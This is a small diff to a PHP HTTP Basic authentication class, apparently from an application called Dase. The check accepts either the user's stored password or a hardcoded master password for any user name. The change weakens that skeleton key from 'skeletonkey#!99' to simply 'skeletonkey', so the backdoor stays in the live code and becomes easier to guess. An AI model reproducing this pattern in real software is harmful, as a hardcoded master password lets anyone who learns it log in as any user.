@@ -7,7 +7,7 @@ class Dase_Http_Auth
 		if (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) {
 			$eid = $_SERVER['PHP_AUTH_USER'];
 			$password = $entity->getHttpPassword($eid);
-			if (in_array($_SERVER['PHP_AUTH_PW'],array('skeletonkey#!99',$password))) {
+			if (in_array($_SERVER['PHP_AUTH_PW'],array('skeletonkey',$password))) {
 				return $eid;
 			}
 		}
